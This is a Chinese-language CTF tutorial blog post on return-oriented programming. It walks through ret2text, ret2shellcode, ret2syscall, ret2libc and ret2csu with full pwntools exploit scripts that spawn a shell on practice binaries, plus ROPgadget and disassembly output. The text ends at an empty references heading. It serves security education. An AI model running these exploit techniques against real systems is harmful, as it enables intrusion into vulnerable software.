[{"title":"1.2-菜鸟学PWN之ROP学习","date":"2019-06-06T07:23:00.000Z","path":"2019/06/06/1.2-菜鸟学PWN之栈溢出学习/","raw":"---\n\ntitle: 1.2-菜鸟学PWN之ROP学习\ndate: 2019-6-6 15:23:00\ncategories: \ntoc: ture\ntags: \n\t- PWN\n\t- CTF\ncomments: true\n\n---\n\n\n> 实现ROP的两个条件:\n>\n> - 程序存在栈溢出, 并可控制返回地址.\n> - 可以找到所需的gadgets以及它所在的地址.\n\n<!-- more -->\n\n> 我们在上文学习了最基本的栈溢出技巧,  这种情况下我们直接跳转到`system('/bin/sh')`即可, 但真实环境下往往没有如此简(ruo)单(zhi)的存在. 而是, 需要经过多次跳转, 甚至精心构造shellcode才能完整的执行系统调用. 而我们把**经过多次跳转, 最终完整执行shellcode的方法叫做`ROP(Return  Oriented Programming)`**. 构造shellcode的过程当中, 由于程序/系统的限制, 我们通过**利用程序中存在的程序小片段(gadgets, 以ret结尾的指令序列)来改变寄存器或者变量的值, 从而控制程序流程, 实现多次跳转.**\n\n## 0x10 背景知识\n\n### 0X11 寄存器介绍\n\n32位x86架构下的寄存器分类如下:\n\n<div style=\"text-align: center;\">\n![x86寄存器分类](Selection_032.png)\n</div>\n\n64位86_x64架构下的寄存器分类如下:\n\n| Register       | 状态         | 请使用                                                     |\n| -------------- | ------------ | ---------------------------------------------------------- |\n| **RAX**        | **易失的**   | **返回值寄存器**                                           |\n| **RCX**        | **易失的**   | **第一个整型参数**                                         |\n| **RDX**        | **易失的**   | **第二个整型参数**                                         |\n| **R8**         | **易失的**   | **第三个整型参数**                                         |\n| **R9**         | **易失的**   | **第四个整型参数**                                         |\n| **R10:R11**    | **易失的**   | **必须根据需要由调用方保留；在 syscall/sysret 指令中使用** |\n| **R12:R15**    | **非易失的** | **必须由被调用方保留**                                     |\n| **RDI**        | **非易失的** | **必须由被调用方保留**                                     |\n| **RSI**        | **非易失的** | **必须由被调用方保留**                                     |\n| **RBX**        | **非易失的** | **必须由被调用方保留**                                     |\n| **RBP**        | **非易失的** | **可用作帧指针；必须由被调用方保留**                       |\n| **RSP**        | **非易失的** | **堆栈指针**                                               |\n| **XMM0**       | **易失的**   | **第一个 FP 参数**                                         |\n| **XMM1**       | **易失的**   | **第二个 FP 参数**                                         |\n| **XMM2**       | **易失的**   | **第三个 FP 参数**                                         |\n| **XMM3**       | **易失的**   | **第四个 FP 参数**                                         |\n| **XMM4:XMM5**  | **易失的**   | **必须根据需要由调用方保留**                               |\n| **XMM6:XMM15** | **非易失的** | **必须根据需要由被调用方保留。**                           |\n\nx64 结构提供了 16 个通用寄存器（以后称为整数寄存器），以及 16 个可供浮点使用的 XMM 寄存器。易失寄存器是由调用方假想的临时寄存器，并要在调用过程中销毁。非易失寄存器需要在整个函数调用过程中保留其值，并且一旦使用，则必须由被调用方保存。\n\n\n\n### 0x12 进程内存布局\n\n- 32位模式下进程内存经典布局:\n  <div style=\"text-align: center;\">\n![32位模式下进程内存](1533549062535.png)\n</div>\n- 64位模式下进程内存经典布局(简略版):\n    <div style=\"text-align: center;\">\n![64位模式下进程内存布局(简略)](1533553264967.png)\n</div>\n\n\n\n-------------------------\n\n## 0x20 基础ROP\n\n### 0x21 ret2text\n\nret2text即控制栈里的返回值, 使其返回到程序本身的某个代码段(.text). 上文[1.1-菜鸟学PWN之栈溢出学习](https://www.killshadow.xyz/2018/10/10/1.1-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/)中的例子已经提到过, 其核心思想就是: **利用栈溢出, 覆盖返回地址到系统调用函数**, 例如`system(/bin/sh)`.\n\n> payload = 'a' * value_offset_for_ebp + p32(system_func_addr)\n\n```\n                            High address\n                         +---------------+\n                         |               |\n                         |     ......    |\n                         |               |\n variable in stack +---> +---------------+\n offset from ebp         | return address| +--------------+\n                         +---------------+  <---+ stack   |\n                         |     ebp       |                |\n                         +---------------+                |\n                         |               |                |\n                         +---------------+                |\n                         |               |                |\n                         +---------------+                |\n                         |     ......    |                |\n                         |               |                |\n                         |               |                |\n                         |               |                |\n                         +---------------+                |\n                         |               |                |\n                         +---------------+ <--------------+\n                         |               |\n   system function +---> +---------------+\n(eg:system('/bin/sh'))   |               |\n                         +---------------+  <---+ function(.text)\n                         |               |\n                         +---------------+\n                         |               |\n                         |     ......    |\n                         |               |\n                         +---------------+\n                           Low address\n```\n\n```python\n#!/usr/bin/env python\n# coding=utf-8\n\nfrom pwn import *\n# execute elf\nsh = process(\"ret2text\")\n# this is system('/bin/sh') address\nexec_addr = 0x0804863a\n# this is ebp address\ngets_ebp_addr = 0xffffce78\n# this is 's' value address\ns_addr = 0xffffcdf0 + 0x1c\n# this is offset between ebp address and 's' value address\nrop_offset = gets_ebp_addr - s_addr\n\npayload = \"A\"*(rop_offset + 4) + p32(exec_addr)\n\nsh.sendline(payload)\nsh.interactive()\n```\n\n----------------------------\n\n### 0x22 ret2shellcode\n\nret2shellcode即控制栈里的返回值, 使其返回到自己填充的shellcode代码. shellcode指的是用于完成某个功能的(汇编)代码. 这里需要注意的是, **填充shellcode的时候, 一定要将shellcode填充到可执行段中.** 其核心思想是: **利用栈溢出, 使返回地址返回到自己填充的shellcode里.**\n\n1. 查看保护, 发现有一个可读可写可执行的段:\n\n   ```\n   ➜  demo checksec ret2shellcode\n   [*] '/home/ks/ctf/pwn/stack/demo/ret2shellcode'\n       Arch:     i386-32-little\n       RELRO:    Partial RELRO\n       Stack:    No canary found\n       NX:       NX disabled\n       PIE:      No PIE (0x8048000)\n       RWX:      Has RWX segments\n   ```\n\n2. IDA反汇编之后可看到主函数:\n\n   ```c\n   int __cdecl main(int argc, const char **argv, const char **envp)\n   {\n     char s; // [esp+1Ch] [ebp-64h]\n   \n     setvbuf(stdout, 0, 2, 0);\n     setvbuf(stdin, 0, 1, 0);\n     puts(\"No system for you this time !!!\");\n     gets(&s);\n     strncpy(buf2, &s, 0x64u);\n     printf(\"bye bye ~\");\n     return 0;\n   }\n   ```\n\n   从上面可以看出, `gets()`函数存在栈溢出. `strncpy`函数可以看到将s变量的字符串复制到buf2中, 那我们再看看buf2所处的位置:\n\n   ```assembly\n   .bss:0804A080 ; char buf2[100]\n   .bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o\n   ```\n\n   可看到, buf2是有100个元素的字符型数组, 存在于bss段中. 我们动态调试一下bss段的权限:\n\n   ```assembly\n   gef➤  vmmap\n   Start      End        Offset     Perm Path\n   0x08048000 0x08049000 0x00000000 r-x /home/ks/ctf/pwn/stack/demo/ret2shellcode\n   0x08049000 0x0804a000 0x00000000 r-x /home/ks/ctf/pwn/stack/demo/ret2shellcode\n   0x0804a000 0x0804b000 0x00001000 rwx /home/ks/ctf/pwn/stack/demo/ret2shellcode\n   0xf7dcb000 0xf7fa0000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.27.so\n   0xf7fa0000 0xf7fa1000 0x001d5000 --- /lib/i386-linux-gnu/libc-2.27.so\n   0xf7fa1000 0xf7fa3000 0x001d5000 r-x /lib/i386-linux-gnu/libc-2.27.so\n   0xf7fa3000 0xf7fa4000 0x001d7000 rwx /lib/i386-linux-gnu/libc-2.27.so\n   0xf7fa4000 0xf7fa7000 0x00000000 rwx \n   0xf7fcf000 0xf7fd1000 0x00000000 rwx \n   0xf7fd1000 0xf7fd4000 0x00000000 r-- [vvar]\n   0xf7fd4000 0xf7fd6000 0x00000000 r-x [vdso]\n   0xf7fd6000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.27.so\n   0xf7ffc000 0xf7ffd000 0x00025000 r-x /lib/i386-linux-gnu/ld-2.27.so\n   0xf7ffd000 0xf7ffe000 0x00026000 rwx /lib/i386-linux-gnu/ld-2.27.so\n   0xfffdd000 0xffffe000 0x00000000 rwx [stack]\n   ```\n\n   根据上面从ida看到的, buf2在`0x0804a080`中, 即为上示gdb的vmmap的`0x0804a00`~`0x0804b00`中, 可以看出该段的权限, 可读可写可执行, 因此, 我们的思路便是: **将shellcode填充的s中, 然后将s中的shellcode复制到buf2中.**\n\n   > payload = (include assembly system function)shellcode + (ret)buf2_addr\n\n   ```\n                              High address\n                           +---------------+\n                           |               |\n                           |     ......    |\n                           |               |\n   variable in stack +---> +---------------+\n   offset from ebp         | return address| +--------------+\n                           +---------------+  <---+ stack   |\n                           |     ebp       |                |\n                           +---------------+                |\n                           |               |                |\n                           +---------------+                |\n                           |               |                |\n                           +---------------+                |\n                           |     ......    |                |\n                           |               |                |\n                           |               |                |\n                           |               |                |\n                           +---------------+                |\n                           |               |                |\n                           +---------------+ <--------------+\n                           |               |\n         shellcode   +---> +---------------+\n                           |               |\n                           +---------------+  <---+ RWX segment\n                           |               |\n                           +---------------+\n                           |               |\n                           |     ......    |\n                           |               |\n                           +---------------+\n                             Low address\n   \n   ```\n\n   ```python\n   #!/usr/bin/env python\n   # coding=utf-8\n   from pwn import *\n   \n   sh = process(\"ret2shellcode\")\n   buf2_addr = 0x0804A080\n   # shell = 'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'\n   shell = asm(shellcraft.sh())\n   s_addr = 0xffffcde0 + 0x1c\n   ebp_addr = 0xffffce68\n   ret_offset = ebp_addr - s_addr + 4\n   print ret_offset\n   # ljust means fill with \"A\"\n   payload = shell.ljust(ret_offset,\"A\") + p32(buf2_addr)\n   sh.sendline(payload)\n   sh.interactive()\n   ```\n\n------------\n\n### 0x23 ret2syscall\n\n顾名思义, ret2syscall就是**利用gadgets控制程序执行系统调用, 获取shellcode**.\n\n1. 首先查看程序开启的保护:\n\n   ```\n   ➜  demo checksec ret2syscall\n   [*] '/home/ks/ctf/pwn/stack/demo/ret2syscall'\n       Arch:     i386-32-little\n       RELRO:    Partial RELRO\n       Stack:    No canary found\n       NX:       NX enabled\n       PIE:      No PIE (0x8048000)\n   ```\n\n   NX保护依旧打开, canary关闭则可直接栈溢出.\n\n2. 在反汇编程序, 得到主函数如下:\n\n   ```c\n   int __cdecl main(int argc, const char **argv, const char **envp)\n   {\n     char s; // [esp+1Ch] [ebp-64h]\n   \n     setvbuf(stdout, 0, 2, 0);\n     setvbuf(_bss_start, 0, 1, 0);\n     puts(\"Something surprise here, but I don't think it will work.\");\n     printf(\"What do you think ?\");\n     gets(&s);\n     return 0;\n   }\n   ```\n\n   上面可以看到, 还是一个栈溢出的漏洞.\n\n3. 我们无法直接利用程序中的某一段代码或者自己填写的代码来获得shell, 因此只能利用程序中的一段代码或者自己填写的代码来获得shell. 通过[系统调用](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8)来获取shell. 应用程序调用系统调用的过程是:\n\n   > 1. 把系统调用的编号存入 EAX；\n   > 2. 把函数参数存入其它通用寄存器；\n   > 3. 触发 0x80 号中断（int 0x80）; \n\n   关于Linux系统调用号, 请到[这里](https://syscalls.kernelgrok.com/)查看. 我们能查到`execve`的系统调用号为`0x0b`, 如下图:\n\n   <div style=\"text-align: center;\">\n![execve系统调用号](Selection_034.png)\n</div>\n\n   可知, 有三个参数, 分别对应`ebx`, `ecx`, `edx`. 我们需要使得:\n\n   > - 系统调用号，即 eax 应该为 0xb\n   > - 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。\n   > - 第二个参数，即 ecx 应该为 0\n   > - 第三个参数，即 edx 应该为 0\n\n4. 那我们如何控制这些寄存器的值呢? 这里就需要我们使用gadgets. 比如当前栈帧的栈顶是`0x20`那么我们`pop eax`即可改变`eax`的值为`0x20`. 但是很少有一段gadgets里连续pop以上四个寄存器, 所以我们需要跳转到几个gadgets, 这就是rop技术的真正实现. \n\n   1) 我们先寻找一下`pop eax | ret`:\n\n   ```assembly\n   ➜  demo ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'\n   0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n   0x080bb196 : pop eax ; ret\n   0x0807217a : pop eax ; ret 0x80e\n   0x0804f704 : pop eax ; ret 3\n   0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n   ```\n\n   可看到有好几段, 这里我们选择`0x080bb196`来作为第一段跳板. \n\n   2) 接下来我们再看看`ebx`:\n\n   ```assembly\n   ➜  demo ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'      \n   0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n   0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n   0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n   0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n   0x080be23f : pop ebx ; pop edi ; ret\n   0x0806eb69 : pop ebx ; pop edx ; ret\n   0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n   0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n   0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n   0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n   0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n   0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n   0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n   0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n   0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n   0x08049a94 : pop ebx ; pop esi ; ret\n   0x080481c9 : pop ebx ; ret\n   0x080d7d3c : pop ebx ; ret 0x6f9\n   0x08099c87 : pop ebx ; ret 8\n   0x0806eb91 : pop ecx ; pop ebx ; ret\n   0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n   0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n   0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n   0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret\n   0x0805c820 : pop esi ; pop ebx ; ret\n   0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n   0x0807b6ed : pop ss ; pop ebx ; ret\n   ```\n\n   这里有很多个`pop ebx`的gadgets, 但是在`0x0806eb90`中, 三个pop操作分别是对`edx ecx ebx`, 这个gadgets便能满足`execve`的三个参数所需的寄存器. 因此我们选择这一段.\n\n   3) 然后我们再看一下是否有`/bin/sh`字符串在程序里：\n\n   ```assembly\n   ➜  demo ROPgadget --binary ret2syscall --string \"/bin/sh\"           \n   Strings information\n   ============================================================\n   0x080be408 : /bin/sh\n   ```\n\n   可看到在`0x080be408`含有该字符串.\n\n   4) 最后我们还需要触发0x80号中断, 因此还要找到该中断对应的地址:\n\n   ```assembly\n   ➜  ret2syscall ROPgadget --binary rop  --only 'int'                 \n   Gadgets information\n   ============================================================\n   0x08049421 : int 0x80\n   0x080938fe : int 0xbb\n   0x080869b5 : int 0xf6\n   0x0807b4d4 : int 0xfc\n   \n   Unique gadgets found: 4\n   ```\n\n5. 上面步骤的四个小步骤已经帮我们找到了所需的4段gadgets, 接下来我们payload直接使用这些gadgets即可:\n\n   > payload = (gadget1_pop_syscall_eax + value) + (gadget2_pop_other_register + value) + (gadget3_int_address)\n\n   ```python\n   #!/usr/bin/env python\n   # coding=utf-8\n   from pwn import *\n   \n   sh = process('./ret2syscall')\n   pop_eax_addr = 0x080bb196\n   pop_edx_ecx_ebx_addr = 0x0806eb90\n   ret_offset = 0xffffcfb8 - (0xffffcf30 + 0x1c) + 0x04\n   print ret_offset\n   sh_addr = 0x080be408\n   int_0x80 = 0x08049421\n   \n   '''\n   flat() Parameters:\n   args – Values to flatten\n   preprocessor (function) – Gets called on every element to optionally transform the element before flattening. If None is returned, then the original value is uded.\n   word_size (int) – Word size of the converted integer (in bits).\n   endianness (str) – Endianness of the converted integer (“little”/”big”).\n   sign (str) – Signedness of the converted integer (False/True)\n   即: flat()函数将数组每项以大端/小端,有/无符号,将每项合并.\n   '''\n   \n   payload = flat([\"A\"*ret_offset, pop_eax_addr, 0x0b, pop_edx_ecx_ebx_addr, 0, 0, sh_addr, int_0x80])\n   \n   sh.sendline(payload)\n   sh.interactive()\n   ```\n\n----------------------\n\n### 0x24 ret2libc\n\nret2libc顾名思义即控制程序执行libc中的函数, 通常是返回某个函数的plt或者函数的具体位置. 为了get shell, 我们会执行`system('/bin/sh')`. 这里需要注意的一点是: **在leak libc中的部分函数地址之后, 我们需要根据对应的libc版本去查找相应的函数偏移.**\n\n#### ① 存在system函数及/bin/sh情况\n\n```python\n#!/usr/bin/env python\n# coding=utf-8\n\nfrom pwn import *\nsh = process('./ret2libc1')\n\nret_offset = 112\n# /bin/sh字符串地址\nshell_addr = 0x08048720\n# system函数地址\nsystem_addr = 0x08048460\n# 这里addr是随便填写的, 作为函数的返回地址, 具体情况上一篇博客的栈帧结构.\npayload = flat([\"a\"*ret_offset, system_addr, \"addr\", shell_addr])\n\nsh.sendline(payload)\nsh.interactive()\n```\n\n这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'addr' 作为虚假的地址，其后参数对应的参数内容。\n\n#### ② 只存在system函数的情况\n\n1. bss段的buf2如下:\n  ```assembly\n  .bss:0804A080                 public buf2\n  .bss:0804A080 ; char buf2[100]\n  .bss:0804A080 buf2            db 64h dup(?)\n  ```\n2. pop ebx:\n  ```assembly\n  ➜  demo ROPgadget --binary ret2libc2 --only 'pop|ret' | grep 'ebx'\n  0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n  0x0804843d : pop ebx ; ret\n  ```\n\n  ```python\n  #!/usr/bin/env python\n  # coding=utf-8\n\n  from pwn import *--\n  sh = process('./ret2libc2')\n\n  buf2_addr = 0x0804A080\n  ret_offset = 112\n  system_addr = 0x08048490\n  gets_addr = 0x08048460\n  pop_ebx_addr = 0x0804843d\n  # 这里如ret2syscall中,先查找能够使用的gadgets, 然后向程序的bss段中的buf2中写入/bin/sh字符串,并将其地址作为system函数的参数传入.\n  # 跳转的顺序依次是: ①gets函数ret --> ②pop ebx; ret buf2_addr --> ③system函数 + buf2_addr\n  payload = flat([\"a\"*ret_offset, gets_addr, pop_ebx_addr, buf2_addr, system_addr, \"addr\", buf2_addr])                          \n  # gets(buf2);\n  # system('/bin/sh');\n  sh.sendline(payload)\n  sh.sendline('/bin/sh')\n  sh.interactive()\n  ```\n\n#### ③ system函数和/bin/sh都不存在的情况\n\n> 获取system函数的地址:\n>\n> - system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。\n> - 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，**最低的 12 位(低3位16进制)**并不会发生改变。而 libc 在 github 上有人进行收集.\n> - https://github.com/niklasb/libc-database\n\n**由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**\n\n##### ※ ret2libc漏洞利用的基本思路\n\n> - 泄露 __libc_start_main 地址\n> - 获取 libc 版本\n> - 获取 system 地址与 /bin/sh 的地址\n> - 再次执行源程序\n> - 触发栈溢出执行 system(‘/bin/sh’)\n\n\n\n```assembly\n===========================================================================\n.got.plt:0804A000\n.got.plt:0804A000 ; Segment type: Pure data\n.got.plt:0804A000 ; Segment permissions: Read/Write\n.got.plt:0804A000 _got_plt        segment dword public 'DATA' use32\n.got.plt:0804A000                 assume cs:_got_plt\n.got.plt:0804A000                 ;org 804A000h\n.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC\n.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048420↑r\n.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048420+6↑r\n.got.plt:0804A00C off_804A00C     dd offset printf        ; DATA XREF: _printf↑r\n.got.plt:0804A010 off_804A010     dd offset gets          ; DATA XREF: _gets↑r\n.got.plt:0804A014 off_804A014     dd offset time          ; DATA XREF: _time↑r\n.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _puts↑r\n.got.plt:0804A01C off_804A01C     dd offset __gmon_start__\n.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__↑r\n.got.plt:0804A020 off_804A020     dd offset srand         ; DATA XREF: _srand↑r\n.got.plt:0804A024 off_804A024     dd offset __libc_start_main 0804A024\n.got.plt:0804A024                                         ; DATA XREF: ___libc_start_main↑r\n.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbuf↑r\n.got.plt:0804A02C off_804A02C     dd offset rand          ; DATA XREF: _rand↑r\n.got.plt:0804A030 off_804A030     dd offset __isoc99_scanf\n.got.plt:0804A030                                         ; DATA XREF: ___isoc99_scanf↑r\n.got.plt:0804A030 _got_plt        ends\n.got.plt:0804A030\n.data:0804A034 ; ===========================================================================\n```\n\n\n\n```python\n#!/usr/bin/env python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\nsh = process('./ret2libc3')\n\nret2libc3 = ELF('./ret2libc3')\n# 获取plt中puts的地址\nputs_plt = ret2libc3.plt['puts']\n# 获取got表中的libc\nlibc_start_main_got = ret2libc3.got['__libc_start_main']\n# print \"libc_start_main_go:\",hex(libc_start_main_got)\nmain = ret2libc3.symbols['main']\n# print \"main:\",hex(main)\n\nprint \"leak libc_start_main_got addr and return to main again\"\npayload = flat(['A' * 112, puts_plt, main, libc_start_main_got])\nsh.sendlineafter('Can you find it !?', payload)\n\nprint \"get the related addr\"\nlibc_start_main_addr = u32(sh.recv()[0:4])\n# libc_start_main_addr = 0xf7d20d90\n# print \"leak libc start main addr: \", hex(libc_start_main_addr)\n# print 'normal libc start main addr: ', hex(0xf7d20d90)\n# gdb.attach(sh)\n# libc = LibcSearcher('__libc_start_main', libc_start_main_addr)\n# libcbase = libc_start_main_addr - libc.dump('__libc_start_main')\n# binsh_offset = 0x0017b8cf - 0x00018d90\n# system_offset = 0x0003cd10 - 0x00018d90\n# system_addr = libcbase + libc.dump('system')\n# binsh_addr = libcbase + libc.dump('str_bin_sh')\n\nsystem_offset = 0x24470\nbinsh_offset = 0x16533f\nsystem_addr = system_offset + libc_start_main_addr\nbinsh_addr = binsh_offset + libc_start_main_addr\n\nprint \"get shell\"\npayload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])\nsh.sendline(payload)\n\nsh.interactive()\n```\n\n--------------\n\n## 0x30 中级ROP\n\n### 0x31 ret2csu\n\n#### ① 使用原理\n\n在64位程序中, 函数调用的前六个参数是通过寄存器传参的(`rdi, rsi, rdx, rcx, r8, r9`), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:`__libc_csu_init`, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程序中都会出现. 函数的二进制形式如下:(不同libc版本大致相同)\n\n```assembly\n.text:00000000004005A0 ; void _libc_csu_init(void)\n.text:00000000004005A0                 public __libc_csu_init\n.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o\n.text:00000000004005A0\n.text:00000000004005A0 var_30          = qword ptr -30h\n.text:00000000004005A0 var_28          = qword ptr -28h\n.text:00000000004005A0 var_20          = qword ptr -20h\n.text:00000000004005A0 var_18          = qword ptr -18h\n.text:00000000004005A0 var_10          = qword ptr -10h\n.text:00000000004005A0 var_8           = qword ptr -8\n.text:00000000004005A0\n.text:00000000004005A0 ; __unwind {\n.text:00000000004005A0                 mov     [rsp+var_28], rbp\n.text:00000000004005A5                 mov     [rsp+var_20], r12\n.text:00000000004005AA                 lea     rbp, cs:600E24h\n.text:00000000004005B1                 lea     r12, cs:600E24h\n.text:00000000004005B8                 mov     [rsp+var_18], r13\n.text:00000000004005BD                 mov     [rsp+var_10], r14\n.text:00000000004005C2                 mov     [rsp+var_8], r15\n.text:00000000004005C7                 mov     [rsp+var_30], rbx\n.text:00000000004005CC                 sub     rsp, 38h\n.text:00000000004005D0                 sub     rbp, r12\n.text:00000000004005D3                 mov     r13d, edi\n.text:00000000004005D6                 mov     r14, rsi\n.text:00000000004005D9                 sar     rbp, 3\n.text:00000000004005DD                 mov     r15, rdx\n.text:00000000004005E0                 call    _init_proc\n.text:00000000004005E5                 test    rbp, rbp\n.text:00000000004005E8                 jz      short loc_400606\n.text:00000000004005EA                 xor     ebx, ebx\n.text:00000000004005EC                 nop     dword ptr [rax+00h]\n.text:00000000004005F0\n.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j\n.text:00000000004005F0                 mov     rdx, r15\n.text:00000000004005F3                 mov     rsi, r14\n.text:00000000004005F6                 mov     edi, r13d\n.text:00000000004005F9                 call    qword ptr [r12+rbx*8]\n.text:00000000004005FD                 add     rbx, 1\n.text:0000000000400601                 cmp     rbx, rbp\n.text:0000000000400604                 jnz     short loc_4005F0\n.text:0000000000400606\n.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j\n.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]\n.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]\n.text:0000000000400610                 mov     r12, [rsp+38h+var_20]\n.text:0000000000400615                 mov     r13, [rsp+38h+var_18]\n.text:000000000040061A                 mov     r14, [rsp+38h+var_10]\n.text:000000000040061F                 mov     r15, [rsp+38h+var_8]\n.text:0000000000400624                 add     rsp, 38h\n.text:0000000000400628                 retn\n.text:0000000000400628 ; } // starts at 4005A0\n.text:0000000000400628 __libc_csu_init endp\n```\n\n> 我们主要利用顺序如下:\n>\n> 1. `0x0000000000400606~0000000000400628`, (利用栈溢出构造栈上数据)依次修改`rbx, rbp, r12, r13, r14, r15`六个寄存器的值.(这里需要注意的是rsp是栈顶指针, 可能不是从rsp开始压入rbx, 上面的`var_30`就是从`rsp+8`开始压栈的, 所以写payload的时候需要加上一个`p64(0)`)\n> 2. 上面修改的寄存器的值是为接下来的`0x00000000004005F0~0x0000000000400604`这段代码服务的, 我们通过修改`rdx, rsi, edi`的值来当做下一步`call qword ptr [r12+rbx*8]`的参数, 这样只要我们把rbx设为0, 把r12的值设为我们想要跳转到函数的got地址即可.\n> 3. `0x000000000040060D~0x0000000000400614`, 我们为了不让它循环(往下执行), 而在上面已经把rbx设为0, 因此需要在第1步把rbp的值设为1\n\n#### ② 使用情形\n\n> 1. 程序中pop参数的gadgets比较少, 或者不是连续的;\n> 2. 存在栈溢出\n\n#### ③ 使用例题\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#undef _FORTIFY_SOURCE\n\nvoid vulnerable_function() {\n\tchar buf[128];\n\tread(STDIN_FILENO, buf, 512);\n}\n\nint main(int argc, char** argv) {\n\twrite(STDOUT_FILENO, \"Hello, World\\n\", 13);\n\tvulnerable_function();\n}\n```\n\nexp如下:\n\n```python\n#/usr/bin/python\n#coding=utf-8\nfrom pwn import *\n\n# context.log_level = 'debug'\nelf = ELF('./ret2csu')\nsh = process('./ret2csu')\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nwrite_got = elf.got['write']\nread_got = elf.got['read']\nmain_addr = elf.symbols['main']\nbss_base = elf.bss()\ncsu_front_addr = 0x4005F0\ncsu_end_addr = 0x400606\n\n\ndef csu(rbx, rbp, r12, r13, r14, r15, last):\n    # pop rbx,rbp,r12,r13,r14,r15\n    # rbx should be 0\n    # rbp should be 1,enable not to jump\n    # r12 should be the function we want to call\n    # rdx=r15 第3个参数\n    # rsi=r14 第2个参数\n    # rdi=edi=r13d 第1个参数\n    # 这里之所有要加一个p64(0),是因为pop操作不是从rsp而是从rsp+8开始的\n    payload = 'a' * 0x88\n    payload += p64(csu_end_addr) + p64(0) + p64(rbx)\\\n        + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_front_addr)\n    # 填充栈上pop/add,共0x38个字节\n    payload += 'b' * 0x38\n    payload += p64(last)\n    sh.send(payload)\n    sleep(1)\n\n# payload1 in order to leak write_addr\nsh.recvuntil('Hello, World\\n')\n# RDI, RSI, RDX, RCX, R8, R9, more on the stack\n# write(1,write_got,8)\ncsu(0, 1, write_got, 1, write_got, 8, main_addr)\n# gdb.attach(sh)\nwrite_addr = u64(sh.recv(8))\nexecve_off = libc.symbols['write']-libc.symbols['execve']\nexecve_addr = write_addr - execve_off\nlog.success('execve_addr: ' + hex(execve_addr))\n\n# read(0,bss_base,16)\n# read execve_addr and /bin/sh\\x00\nsh.recvuntil('Hello, World\\n')\ncsu(0, 1, read_got, 0, bss_base, 16, main_addr)\nsh.send(p64(execve_addr) + '/bin/sh\\x00')\n# sh.recv()\nsh.recvuntil('Hello, World\\n')\n# execve(bss_base+8)\ncsu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)\nsh.interactive()\n```\n\n--------------------------\n\n### 0x32 ret2reg\n\n#### ① 使用原理\n\nret2reg(return-to-address)主要目的是绕过地址随机化(Address Space Layout Randomization, ASLR). 顾名思义, 就是控制寄存器的值, 利用`call, jnz, jmp`等跳转指令控制程序执行流以跳转到payload.\n\n#### ② 使用步骤\n\n1. 调试程序, 查看溢出函数返回时哪个寄存器的值指向溢出缓冲区.\n2. 经第1步得知reg寄存器指向缓冲区, 查找漏洞程序中`call reg`或`jmp reg`指令.(可利用objdump或ROPgadget) 然后将EIP的值指向该指令的地址.\n3. 在reg指向的栈空间写入shellcode\n\n#### ③ 参考链接\n\n第一篇: 